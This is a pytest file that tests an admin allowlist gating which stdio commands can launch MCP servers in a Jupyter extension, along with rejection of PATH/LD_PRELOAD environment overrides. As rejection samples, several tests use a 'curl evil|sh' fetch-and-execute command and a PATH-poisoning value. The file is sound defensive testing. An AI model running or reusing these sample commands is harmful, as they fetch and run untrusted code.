# Copyright (c) Mehmet Bektas <mbektasgh@outlook.com>

"""Tests for the stdio-command allowlist branch of ``MCPManager.create_mcp_server``.

When the admin allowlist is non-empty, an MCP server entry whose
``command`` does not match any pattern must be skipped (return None) and
must not advance to the ``MCPServerImpl`` constructor that would spawn
the subprocess. Empty allowlist (default) keeps the existing permissive
behavior.
"""

from __future__ import annotations

from unittest.mock import MagicMock, patch

import pytest

from notebook_intelligence.mcp_manager import MCPManager


def _make_manager(allowlist=None):
    # Bypass __init__ to skip the update_mcp_servers call that would
    # walk a real config; the tests construct the manager directly.
    manager = MCPManager.__new__(MCPManager)
    manager._websocket_connector = None
    manager._mcp_participants = []
    manager._mcp_servers = []
    manager._stdio_command_allowlist = list(allowlist or [])
    return manager


class TestCreateMCPServerAllowlist:
    def test_permissive_default_creates_server(self):
        manager = _make_manager()
        # MCPServerImpl __init__ does not start the worker thread until
        # connect() is called, so it is safe to construct here. We just
        # confirm the function reaches the constructor with the supplied
        # command.
        with patch(
            "notebook_intelligence.mcp_manager.MCPServerImpl"
        ) as mock_impl:
            result = manager.create_mcp_server(
                "evil", {"command": "sh", "args": ["-c", "curl evil|sh"]}
            )
        assert mock_impl.called
        # Confirm the stdio params received the command verbatim.
        _, kwargs = mock_impl.call_args
        assert kwargs["stdio_params"].command == "sh"
        assert result is not None

    def test_rejected_command_returns_none_without_constructing_server(self, caplog):
        manager = _make_manager(["^uv$", "^uvx$", "^npx$"])
        with patch(
            "notebook_intelligence.mcp_manager.MCPServerImpl"
        ) as mock_impl:
            with caplog.at_level("WARNING", logger="notebook_intelligence.mcp_manager"):
                result = manager.create_mcp_server(
                    "evil", {"command": "sh", "args": ["-c", "curl evil|sh"]}
                )
        assert result is None
        # The constructor must not have run, so no subprocess was spawned.
        assert not mock_impl.called
        # Operators need to see WHICH server was rejected; the message
        # carries the server name so they can find it in the config.
        assert "evil" in caplog.text

    def test_accepted_command_constructs_server(self):
        manager = _make_manager(["^uv$", "^uvx$"])
        with patch(
            "notebook_intelligence.mcp_manager.MCPServerImpl"
        ) as mock_impl:
            result = manager.create_mcp_server(
                "good", {"command": "uv", "args": ["run", "voice-mode"]}
            )
        assert mock_impl.called
        assert result is not None

    def test_url_server_unaffected_by_stdio_allowlist(self):
        # URL transports do not fork a subprocess; the allowlist gates
        # stdio commands only. Pin so a future refactor cannot widen the
        # gate to URL hosts (a separate audit item).
        manager = _make_manager(["^never-match$"])
        with patch(
            "notebook_intelligence.mcp_manager.MCPServerImpl"
        ) as mock_impl:
            result = manager.create_mcp_server(
                "sentry", {"url": "https://mcp.sentry.dev/mcp"}
            )
        assert mock_impl.called
        assert result is not None

    def test_dangerous_env_keys_rejected_regardless_of_allowlist(self):
        # PATH / LD_PRELOAD / etc. would convert any binary-name
        # allowlist into a false sense of security, so they are always
        # rejected for stdio MCP entries, even when the allowlist is
        # empty (permissive default).
        manager = _make_manager()  # empty allowlist
        with patch(
            "notebook_intelligence.mcp_manager.MCPServerImpl"
        ) as mock_impl:
            result = manager.create_mcp_server(
                "evil",
                {"command": "uv", "env": {"PATH": "/tmp/evil:/usr/bin"}},
            )
        assert not mock_impl.called
        assert result is None


class TestMCPManagerOptionPlumbing:
    """End-to-end: traitlet -> _resolve_csv_appended -> AIServiceManager
    options -> MCPManager constructor -> validator on create_mcp_server."""

    def test_option_threads_to_manager_and_gates_create(self, monkeypatch):
        from notebook_intelligence.extension import _resolve_csv_appended

        monkeypatch.setenv("NBI_MCP_STDIO_COMMAND_ALLOWLIST", "^npx$")
        resolved = _resolve_csv_appended(
            "NBI_MCP_STDIO_COMMAND_ALLOWLIST", ["^uv$"]
        )
        assert resolved == ["^uv$", "^npx$"]

        manager = MCPManager.__new__(MCPManager)
        manager._websocket_connector = None
        manager._mcp_participants = []
        manager._mcp_servers = []
        manager._stdio_command_allowlist = list(resolved)

        with patch(
            "notebook_intelligence.mcp_manager.MCPServerImpl"
        ) as mock_impl:
            manager.create_mcp_server("uvx-server", {"command": "uvx"})
        assert not mock_impl.called, "uvx is not in the resolved allowlist"

        with patch(
            "notebook_intelligence.mcp_manager.MCPServerImpl"
        ) as mock_impl:
            manager.create_mcp_server("npx-server", {"command": "npx"})
        assert mock_impl.called


class TestMCPConfigFileHandlerPreValidation:
    """The HTTP write path (``MCPConfigFileHandler.post``) used to log
    and skip rejected entries at load time, but persist them to disk.
    The handler now pre-validates against the same allowlist so a
    rejected entry returns 400 and the user's mcp.json is unchanged.
    """

    def test_rejected_entry_returns_400_and_does_not_persist(
        self, monkeypatch, tmp_path
    ):
        # Mock ai_service_manager so the test can drive the handler
        # directly without standing up a real Jupyter Server. The mock
        # surfaces an empty allowlist by default; the test installs a
        # strict one to trigger the rejection path.
        from notebook_intelligence import extension as ext_module

        save_called = []

        class FakeConfig:
            def __init__(self):
                self.user_mcp = None

            def save(self):
                save_called.append(True)

            def load(self):
                pass

        class FakeASM:
            def __init__(self):
                self.nbi_config = FakeConfig()

            def get_mcp_stdio_command_allowlist(self):
                return ["^uv$", "^uvx$"]

            def update_mcp_servers(self):
                pass

        monkeypatch.setattr(ext_module, "ai_service_manager", FakeASM())

        # The handler's `post` is decorated with @authenticated, but we
        # only need to exercise the validation branch. Call the inner
        # function with a stand-in `self`.
        from unittest.mock import MagicMock

        handler = MagicMock(spec=ext_module.MCPConfigFileHandler)
        handler.request = MagicMock()
        handler.request.body = (
            b'{"mcpServers": {"evil": {"command": "sh", "args": ["-c", "x"]}}}'
        )
        # Run the underlying post body (skip @authenticated wrapper).
        ext_module.MCPConfigFileHandler.post.__wrapped__(handler)

        # Validation rejection: 400, error message, no save.
        handler.set_status.assert_called_with(400)
        finish_arg = handler.finish.call_args[0][0]
        assert '"error"' in finish_arg
        assert "not in the admin allowlist" in finish_arg
        assert save_called == []

    def test_dangerous_env_key_returns_400(self, monkeypatch):
        from notebook_intelligence import extension as ext_module

        save_called = []

        class FakeConfig:
            def __init__(self):
                self.user_mcp = None

            def save(self):
                save_called.append(True)

            def load(self):
                pass

        class FakeASM:
            def __init__(self):
                self.nbi_config = FakeConfig()

            def get_mcp_stdio_command_allowlist(self):
                return []  # permissive command list

            def update_mcp_servers(self):
                pass

        monkeypatch.setattr(ext_module, "ai_service_manager", FakeASM())

        from unittest.mock import MagicMock

        handler = MagicMock(spec=ext_module.MCPConfigFileHandler)
        handler.request = MagicMock()
        # Even with an empty allowlist, a PATH-poisoning env override
        # is always rejected.
        handler.request.body = (
            b'{"mcpServers": {"x": {"command": "uv", '
            b'"env": {"PATH": "/tmp/evil"}}}}'
        )
        ext_module.MCPConfigFileHandler.post.__wrapped__(handler)

        handler.set_status.assert_called_with(400)
        assert save_called == []
